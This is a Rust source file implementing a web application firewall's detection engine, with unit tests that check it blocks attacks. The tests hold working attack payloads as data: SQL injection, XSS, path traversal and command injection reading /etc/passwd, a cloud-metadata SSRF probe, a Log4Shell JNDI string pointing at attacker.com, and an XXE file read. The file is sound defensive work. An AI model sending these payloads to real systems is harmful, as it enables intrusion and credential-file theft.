//! Main WAF detection engine.
//!
//! The engine is the single entry point used by the proxy / agent crates:
//!
//! ```ignore
//! let engine = WafEngine::new(&WafEngineConfig::default());
//! let verdict = engine.inspect(&request_data);
//! match verdict.action {
//!     WafAction::Block => return forbidden(),
//!     WafAction::Challenge => return challenge_page(),
//!     _ => forward_to_origin(),
//! }
//! ```
//!
//! Internally the engine runs the multi-stage pipeline documented on
//! [`WafEngine::inspect`].

use std::net::IpAddr;
use std::str::FromStr;

use serde::{Deserialize, Serialize};

use crate::normalize::{NormalizedRequest, normalize_request};
use crate::rules::expression::{EvalContext, evaluate};
use crate::rules::managed::default_managed_rules;
use crate::rules::signatures::{SignatureEngine, detect_sqli, detect_xss};
use crate::rules::{CompiledRule, RuleAction};
use crate::score::{AnomalyScorer, ScoreBreakdown, ScoreClass};
use crate::{WafAction, WafVerdict};

/// Operating mode for the engine.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum WafMode {
    /// Engine is disabled — every request returns `Pass` immediately.
    Off,
    /// Detect and log but never block. Verdicts are downgraded from
    /// `Block`/`Challenge` to `Monitor`.
    Monitor,
    /// Full enforcement.
    #[default]
    Block,
}

/// Static configuration used to build a [`WafEngine`].
#[derive(Debug, Clone)]
pub struct WafEngineConfig {
    pub mode: WafMode,
    /// Aggregate-score block threshold (default 40).
    pub threshold: u32,
    /// 1 (loose) … 4 (paranoid).
    pub paranoia_level: u8,
    /// Maximum URL-decoding passes (default 3).
    pub max_decode_layers: usize,
    /// User-supplied rules; combined with managed defaults when
    /// `enable_managed_rules` is true.
    pub rules: Vec<CompiledRule>,
    pub enable_managed_rules: bool,
    /// When `true`, a Stage-1 critical hit short-circuits to an immediate
    /// Block verdict without running the rule engine.
    pub fast_path_block_on_critical: bool,
}

impl Default for WafEngineConfig {
    fn default() -> Self {
        Self {
            mode: WafMode::Block,
            threshold: 40,
            paranoia_level: 2,
            max_decode_layers: 3,
            rules: Vec::new(),
            enable_managed_rules: true,
            fast_path_block_on_critical: true,
        }
    }
}

/// Input data for a single inspection.
#[derive(Debug, Clone)]
pub struct RequestData {
    pub method: String,
    pub path: String,
    /// Raw query string (without the leading `?`).
    pub query: String,
    /// Header pairs in wire order; names will be lower-cased internally.
    pub headers: Vec<(String, String)>,
    pub body: Option<Vec<u8>>,
    pub client_ip: String,
    /// Optional GeoIP country code (ISO-3166 alpha-2).
    pub country_code: Option<String>,
    /// `"http"` or `"https"`.
    pub scheme: String,
}

impl RequestData {
    pub fn new(method: impl Into<String>, path: impl Into<String>) -> Self {
        Self {
            method: method.into(),
            path: path.into(),
            query: String::new(),
            headers: Vec::new(),
            body: None,
            client_ip: String::new(),
            country_code: None,
            scheme: "http".into(),
        }
    }
}

/// Multi-stage WAF detection engine. Clone is intentionally not derived —
/// share an `Arc<WafEngine>` instead so the Aho-Corasick automaton stays put.
pub struct WafEngine {
    signatures: SignatureEngine,
    rules: Vec<CompiledRule>,
    scorer: AnomalyScorer,
    mode: WafMode,
    max_decode_layers: usize,
    fast_path_block_on_critical: bool,
}

impl std::fmt::Debug for WafEngine {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("WafEngine")
            .field("mode", &self.mode)
            .field("rule_count", &self.rules.len())
            .field("signature_count", &self.signatures.pattern_count())
            .field("scorer", &self.scorer)
            .finish()
    }
}

impl Default for WafEngine {
    fn default() -> Self {
        Self::new(&WafEngineConfig::default())
    }
}

impl WafEngine {
    pub fn new(config: &WafEngineConfig) -> Self {
        let mut rules = Vec::with_capacity(config.rules.len() + 16);
        if config.enable_managed_rules {
            rules.extend(default_managed_rules());
        }
        rules.extend(config.rules.iter().cloned());

        Self {
            signatures: SignatureEngine::new(),
            rules,
            scorer: AnomalyScorer::new(config.threshold, config.paranoia_level),
            mode: config.mode,
            max_decode_layers: config.max_decode_layers.clamp(1, 5),
            fast_path_block_on_critical: config.fast_path_block_on_critical,
        }
    }

    /// Hot-reload the user rule set. Managed defaults are preserved.
    pub fn update_rules(&mut self, user_rules: Vec<CompiledRule>) {
        let managed: Vec<CompiledRule> = self
            .rules
            .drain(..)
            .filter(|r| r.id.starts_with("PINGWAF-"))
            .collect();
        self.rules = managed;
        self.rules.extend(user_rules);
    }

    /// Replace the entire rule set, including managed defaults.
    pub fn replace_all_rules(&mut self, rules: Vec<CompiledRule>) {
        self.rules = rules;
    }

    pub fn set_mode(&mut self, mode: WafMode) {
        self.mode = mode;
    }

    pub fn mode(&self) -> WafMode {
        self.mode
    }

    pub fn set_threshold(&mut self, threshold: u32) {
        self.scorer.threshold = threshold.max(1);
    }

    pub fn set_paranoia_level(&mut self, level: u8) {
        self.scorer.paranoia_level = level.clamp(1, 4);
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Main inspection entry point.
    ///
    /// Pipeline:
    /// 1. Normalize the request (URL multi-decode, HTML entity decode, path
    ///    collapse, query/cookie split).
    /// 2. Stage 1 — Aho-Corasick signature scan + libinjection SQLi/XSS over
    ///    every decoded value. Each hit feeds the anomaly scorer.
    /// 3. If `fast_path_block_on_critical` and a severity-5 hit landed,
    ///    short-circuit to a Block verdict without running Stage 2.
    /// 4. Stage 2 — evaluate compiled rules against an [`EvalContext`] that
    ///    already exposes the Stage-1 sub-scores. Allow actions short-circuit
    ///    the rest of the rule set.
    /// 5. Combine the aggregate score with the engine threshold and mode to
    ///    pick the final action.
    pub fn inspect(&self, request: &RequestData) -> WafVerdict {
        if self.mode == WafMode::Off {
            return WafVerdict::pass();
        }

        let normalized = normalize_request(
            &request.method,
            &request.path,
            &request.query,
            &request.headers,
            request.body.as_deref(),
            self.max_decode_layers,
        );

        let mut breakdown = ScoreBreakdown::clean();
        let mut matched: Vec<String> = Vec::new();
        let mut details: Vec<String> = Vec::new();
        let mut critical_hit = false;

        // ----- Stage 1: signatures + libinjection over every decoded value -----
        for value in &normalized.decoded_values {
            let needle = value.decoded.as_str();
            if needle.is_empty() {
                continue;
            }
            for hit in self.signatures.scan(needle) {
                if hit.severity >= 5 {
                    critical_hit = true;
                }
                self.scorer
                    .add_category_hit(&mut breakdown, hit.category, hit.severity);
                matched.push(hit.pattern_id.clone());
                details.push(format!(
                    "{} [{} sev={}] in {} '{}'",
                    hit.pattern_id,
                    hit.category,
                    hit.severity,
                    value.source.as_str(),
                    value.name
                ));
            }

            // libinjection-style detectors on user-controlled values only.
            // Path/method/header-name are not attacker-typed strings the same
            // way query / body / cookie values are.
            if !matches!(
                value.source,
                crate::normalize::ValueSource::QueryParam
                    | crate::normalize::ValueSource::Cookie
                    | crate::normalize::ValueSource::Body
                    | crate::normalize::ValueSource::Header
            ) {
                continue;
            }
            let (is_sqli, sqli_fp) = detect_sqli(needle);
            if is_sqli {
                // Treat a libinjection hit as severity 5 (critical).
                critical_hit = true;
                self.scorer.add_category_hit(
                    &mut breakdown,
                    crate::rules::signatures::AttackCategory::SqlInjection,
                    5,
                );
                matched.push("LIBINJ-SQLI".to_string());
                details.push(format!(
                    "libinjection-sqli [{}] in {} '{}'",
                    sqli_fp,
                    value.source.as_str(),
                    value.name
                ));
            }
            let (is_xss, xss_fp) = detect_xss(needle);
            if is_xss {
                critical_hit = true;
                self.scorer.add_category_hit(
                    &mut breakdown,
                    crate::rules::signatures::AttackCategory::Xss,
                    5,
                );
                matched.push("LIBINJ-XSS".to_string());
                details.push(format!(
                    "libinjection-xss [{}] in {} '{}'",
                    xss_fp,
                    value.source.as_str(),
                    value.name
                ));
            }
        }

        // Also scan the normalized path itself — traversal patterns commonly
        // appear after `..` resolution rather than in raw query params.
        for hit in self.signatures.scan(&normalized.path) {
            if hit.severity >= 5 {
                critical_hit = true;
            }
            self.scorer
                .add_category_hit(&mut breakdown, hit.category, hit.severity);
            if !matched.contains(&hit.pattern_id) {
                matched.push(hit.pattern_id.clone());
            }
            details.push(format!(
                "{} [{} sev={}] in path",
                hit.pattern_id, hit.category, hit.severity
            ));
        }

        // ----- Build evaluation context (snapshot of Stage-1 scores) -----
        let parsed_ip = IpAddr::from_str(&request.client_ip).ok();
        let ssl = request.scheme.eq_ignore_ascii_case("https");
        let host = normalized.host().to_string();
        let user_agent = normalized.user_agent().to_string();
        let ctx = EvalContext {
            method: normalized.method.clone(),
            path: normalized.path.clone(),
            full_uri: normalized.full_uri.clone(),
            host,
            user_agent,
            body: normalized.body_str.clone(),
            headers: normalized.headers.clone(),
            cookies: normalized.cookies.clone(),
            client_ip: request.client_ip.clone(),
            parsed_ip,
            country_code: request.country_code.clone(),
            ssl,
            waf_score: breakdown.total,
            waf_score_sqli: breakdown.sqli_score,
            waf_score_xss: breakdown.xss_score,
        };

        // ----- Allow pre-pass -----
        // Allow rules are allowlist entries: they must win over both the
        // Stage-1 fast path and every other rule, otherwise an operator
        // could not exempt a health-check endpoint or an internal network.
        for rule in &self.rules {
            if !rule.enabled || rule.action != RuleAction::Allow {
                continue;
            }
            if rule.paranoia_level > self.scorer.paranoia_level {
                continue;
            }
            if !evaluate(&rule.expression, &ctx) {
                continue;
            }
            matched.push(rule.id.clone());
            return WafVerdict {
                action: WafAction::Pass,
                score: breakdown.total_u8(),
                matched_rules: matched,
                details: format!("allow-rule matched: {} [{}]", rule.id, rule.name),
                breakdown,
            };
        }

        // ----- Fast-path Block on critical Stage-1 hit -----
        if self.fast_path_block_on_critical && critical_hit {
            return self.finalize_verdict(
                &mut breakdown,
                matched,
                details,
                Some(WafAction::Block),
                "stage1-critical",
            );
        }

        // ----- Stage 2: rule engine (non-Allow rules) -----
        let mut forced_action: Option<WafAction> = None;
        for rule in &self.rules {
            if !rule.enabled || rule.action == RuleAction::Allow {
                continue;
            }
            if rule.paranoia_level > self.scorer.paranoia_level {
                continue;
            }
            if !evaluate(&rule.expression, &ctx) {
                continue;
            }
            matched.push(rule.id.clone());
            details.push(format!(
                "{} [{}] action={} sev={}",
                rule.id,
                rule.name,
                rule.action.as_str(),
                rule.severity
            ));
            match rule.action {
                RuleAction::Allow => unreachable!("allow rules handled in pre-pass"),
                RuleAction::Log => {
                    self.scorer.add_severity_hit(&mut breakdown, rule.severity);
                }
                RuleAction::Block => {
                    self.scorer.add_severity_hit(&mut breakdown, rule.severity);
                    forced_action = Some(WafAction::Block);
                }
                RuleAction::Challenge | RuleAction::JsChallenge => {
                    self.scorer.add_severity_hit(&mut breakdown, rule.severity);
                    if forced_action != Some(WafAction::Block) {
                        forced_action = Some(WafAction::Challenge);
                    }
                }
            }
        }

        // ----- Final scoring -----
        breakdown.overall_class = self.scorer.classify(breakdown.total);
        let action = if let Some(a) = forced_action {
            a
        } else if self.scorer.should_block(breakdown.total) {
            WafAction::Block
        } else if breakdown.total > 0 {
            // Below threshold but something fired — surface it as Monitor so
            // the caller still logs the event.
            WafAction::Monitor
        } else {
            WafAction::Pass
        };

        let reason = match breakdown.overall_class {
            ScoreClass::Clean => "clean",
            ScoreClass::LikelyClean => "likely-clean",
            ScoreClass::LikelyAttack => "likely-attack",
            ScoreClass::Attack => "attack",
        };
        self.finalize_verdict(&mut breakdown, matched, details, Some(action), reason)
    }

    fn finalize_verdict(
        &self,
        breakdown: &mut ScoreBreakdown,
        matched: Vec<String>,
        details: Vec<String>,
        action: Option<WafAction>,
        reason: &str,
    ) -> WafVerdict {
        breakdown.overall_class = self.scorer.classify(breakdown.total);
        let mut action = action.unwrap_or(WafAction::Pass);
        if self.mode == WafMode::Monitor
            && matches!(action, WafAction::Block | WafAction::Challenge)
        {
            action = WafAction::Monitor;
        }
        // De-dup matched ids while preserving first-seen order.
        let mut seen: Vec<String> = Vec::with_capacity(matched.len());
        for id in matched {
            if !seen.contains(&id) {
                seen.push(id);
            }
        }
        let detail_str = if details.is_empty() {
            reason.to_string()
        } else {
            format!("{}: {}", reason, details.join("; "))
        };
        WafVerdict {
            action,
            score: breakdown.total_u8(),
            matched_rules: seen,
            details: detail_str,
            breakdown: *breakdown,
        }
    }

    /// Expose the normalized view of a request — handy for tests and for
    /// upstream code that wants to log what the WAF actually saw.
    pub fn normalize(&self, request: &RequestData) -> NormalizedRequest {
        normalize_request(
            &request.method,
            &request.path,
            &request.query,
            &request.headers,
            request.body.as_deref(),
            self.max_decode_layers,
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn engine() -> WafEngine {
        WafEngine::new(&WafEngineConfig::default())
    }

    fn req(method: &str, path: &str, query: &str) -> RequestData {
        RequestData {
            method: method.into(),
            path: path.into(),
            query: query.into(),
            headers: vec![
                ("User-Agent".into(), "Mozilla/5.0".into()),
                ("Host".into(), "example.com".into()),
            ],
            body: None,
            client_ip: "203.0.113.10".into(),
            country_code: Some("US".into()),
            scheme: "https".into(),
        }
    }

    #[test]
    fn passes_clean_request() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api/users", "page=1&limit=20"));
        assert_eq!(v.action, WafAction::Pass, "details: {}", v.details);
        assert_eq!(v.score, 0);
        assert!(v.matched_rules.is_empty());
    }

    #[test]
    fn blocks_sqli_in_query() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api/users", "id=1' OR 1=1 --"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
        assert!(v.score > 0);
        assert!(!v.matched_rules.is_empty());
    }

    #[test]
    fn blocks_union_select() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/api/users",
            "id=1 UNION SELECT username, password FROM users",
        ));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_xss_script() {
        let e = engine();
        let v = e.inspect(&req("GET", "/search", "q=<script>alert(1)</script>"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_xss_onerror() {
        let e = engine();
        let v = e.inspect(&req("GET", "/search", "q=<img src=x onerror=alert(1)>"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_path_traversal() {
        let e = engine();
        let v = e.inspect(&req("GET", "/files", "p=../../etc/passwd"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_double_encoded_traversal() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/files",
            "p=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        ));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_command_injection() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api", "cmd=;cat /etc/passwd"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_command_substitution() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api", "cmd=$(whoami)"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_ssrf_metadata() {
        let e = engine();
        let v = e.inspect(&req("GET", "/proxy", "url=http://169.254.169.254/latest/"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn monitor_mode_does_not_block() {
        let cfg = WafEngineConfig {
            mode: WafMode::Monitor,
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/api/users", "id=1' OR 1=1 --"));
        assert_eq!(v.action, WafAction::Monitor);
        assert!(v.score > 0);
    }

    #[test]
    fn off_mode_skips_everything() {
        let cfg = WafEngineConfig {
            mode: WafMode::Off,
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/api/users", "id=1' OR 1=1 --"));
        assert_eq!(v.action, WafAction::Pass);
        assert_eq!(v.score, 0);
    }

    #[test]
    fn allow_rule_short_circuits() {
        let custom = CompiledRule::compile(
            "ALLOW-HEALTH",
            "allow health checks",
            r#"http.request.uri.path eq "/healthz""#,
            RuleAction::Allow,
            1,
            vec!["allow".into()],
        )
        .unwrap();
        let cfg = WafEngineConfig {
            rules: vec![custom],
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/healthz", "id=1' OR 1=1 --"));
        assert_eq!(v.action, WafAction::Pass);
    }

    #[test]
    fn block_rule_on_path() {
        let custom = CompiledRule::compile(
            "BLOCK-SECRET",
            "block /secret",
            r#"http.request.uri.path starts_with "/secret""#,
            RuleAction::Block,
            5,
            vec!["custom".into()],
        )
        .unwrap();
        let cfg = WafEngineConfig {
            rules: vec![custom],
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/secret/data", ""));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
        assert!(v.matched_rules.contains(&"BLOCK-SECRET".to_string()));
    }

    #[test]
    fn cidr_rule_matches_internal_ip() {
        let custom = CompiledRule::compile(
            "ALLOW-INTERNAL",
            "allow internal",
            "ip.src in {10.0.0.0/8}",
            RuleAction::Allow,
            1,
            vec![],
        )
        .unwrap();
        let cfg = WafEngineConfig {
            rules: vec![custom],
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let mut r = req("GET", "/api", "id=1' OR 1=1 --");
        r.client_ip = "10.1.2.3".into();
        let v = e.inspect(&r);
        assert_eq!(v.action, WafAction::Pass);
    }

    #[test]
    fn body_payload_detected() {
        let e = engine();
        let mut r = req("POST", "/api/comment", "");
        r.headers.push(("Content-Type".into(), "application/x-www-form-urlencoded".into()));
        r.body = Some(b"comment=<script>alert(1)</script>&author=bob".to_vec());
        let v = e.inspect(&r);
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn hot_reload_rules() {
        let mut e = engine();
        let initial = e.rule_count();
        let custom = CompiledRule::compile(
            "CUSTOM-1",
            "custom",
            r#"http.host eq "blocked.com""#,
            RuleAction::Block,
            4,
            vec![],
        )
        .unwrap();
        e.update_rules(vec![custom]);
        // Managed rules preserved, plus one custom.
        assert_eq!(e.rule_count(), initial + 1);
    }

    #[test]
    fn log4shell_in_user_agent_blocked() {
        let e = engine();
        let mut r = req("GET", "/", "");
        r.headers.push((
            "User-Agent".into(),
            "${jndi:ldap://attacker.com/x}".into(),
        ));
        let v = e.inspect(&r);
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn xxe_in_body_blocked() {
        let e = engine();
        let mut r = req("POST", "/api/xml", "");
        r.body = Some(
            br#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#
                .to_vec(),
        );
        let v = e.inspect(&r);
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn verdict_breakdown_populated() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api/users", "id=1' UNION SELECT 1,2,3 --"));
        assert!(v.breakdown.total > 0);
        assert!(v.breakdown.sqli_score > 0);
        assert!(!matches!(v.breakdown.overall_class, ScoreClass::Clean));
    }
}
